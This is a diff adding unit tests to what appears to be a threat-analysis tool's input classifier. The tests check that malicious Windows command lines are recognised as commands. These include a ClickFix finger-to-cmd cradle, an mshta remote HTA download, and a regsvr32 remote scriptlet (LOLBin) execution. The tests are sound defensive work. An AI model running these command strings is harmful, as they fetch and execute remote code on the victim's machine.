@@ -96,6 +96,46 @@ describe('classifyCockpitInput — hyphenated-domain regression (ENC_FLAG_RE / i
   })
 })
 
+describe('classifyCockpitInput — multi-interpreter / cmd / LOLBin commands', () => {
+  it('classifies the finger-cradle ClickFix cmd command as command', () => {
+    const raw =
+      "cmd.exe /c for /f %e in ('f^inger user@45.9.148.20') do cmd.exe /c %e & echo x"
+    expect(classifyCockpitInput(raw)).toBe('command')
+  })
+  it('classifies a bare cmd /c invocation as command', () => {
+    expect(classifyCockpitInput('cmd /c whoami & echo x')).toBe('command')
+  })
+  it('classifies an mshta download-and-execute as command', () => {
+    expect(classifyCockpitInput('mshta http://45.9.148.20/x.hta')).toBe('command')
+  })
+  it('classifies a wscript invocation as command', () => {
+    expect(classifyCockpitInput('wscript //E:vbscript C:\\Users\\Public\\x.vbs')).toBe('command')
+  })
+  it('classifies a regsvr32 scriptlet-execution LOLBin as command', () => {
+    expect(classifyCockpitInput('regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll')).toBe('command')
+  })
+})
+
+describe('classifyCockpitInput — cmd/LOLBin false-positive regression (no misroute to enrich)', () => {
+  it('does not misroute a bare cmd.com domain as command', () => {
+    expect(classifyCockpitInput('cmd.com')).toBe('indicator')
+  })
+  it('does not misroute a bare finger.io domain as command', () => {
+    expect(classifyCockpitInput('finger.io')).toBe('indicator')
+  })
+  it('does not misroute a URL with a query-string & as command', () => {
+    expect(classifyCockpitInput('https://example.com/x?a=1&b=2')).toBe('indicator')
+  })
+  it('does not misroute a bare SHA-256 hash as command', () => {
+    expect(
+      classifyCockpitInput('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
+    ).toBe('indicator')
+  })
+  it('does not misroute a bare IPv4 as command', () => {
+    expect(classifyCockpitInput('45.9.148.20')).toBe('indicator')
+  })
+})
+
 describe('classifyCockpitInput — unclassified + determinism', () => {
   it('classifies empty input as unclassified', () => {
     expect(classifyCockpitInput('')).toBe('unclassified')
